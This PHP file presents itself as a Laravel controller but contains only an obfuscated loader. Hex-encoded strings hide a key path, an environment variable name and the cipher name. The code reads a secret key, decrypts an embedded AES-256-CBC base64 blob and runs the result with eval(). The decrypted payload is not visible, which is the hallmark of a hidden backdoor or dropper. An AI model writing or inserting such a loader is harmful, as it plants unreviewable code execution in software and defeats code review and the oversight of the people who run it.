<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('AbuI9uoXxIKB40SmynvBWw==');

$c=base64_decode(

'6gX0Yst4Vp+D6QmCNrfpaVjoMMMu/BJGkMDC1590JGyamIAZFAMR7ipsylhVPTy/k46rPqfBzd/y' .
'dhdjjIRMH0GcdQSSmL+xs9Lm9A3p0/3oCBacdNBLy17lfgi/98SS10exGLeyOk1WePmVEUzjgB6q' .
'ePUQYZTjFtP9kLncW627ZFZE77SNDzEI0ofAArM2f3HMscbz+pLICjV2Lk6DANKjynNB+WfMN42o' .
'cDJSoOP18Ee5Tv4gW4xuwaJTA/JE'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

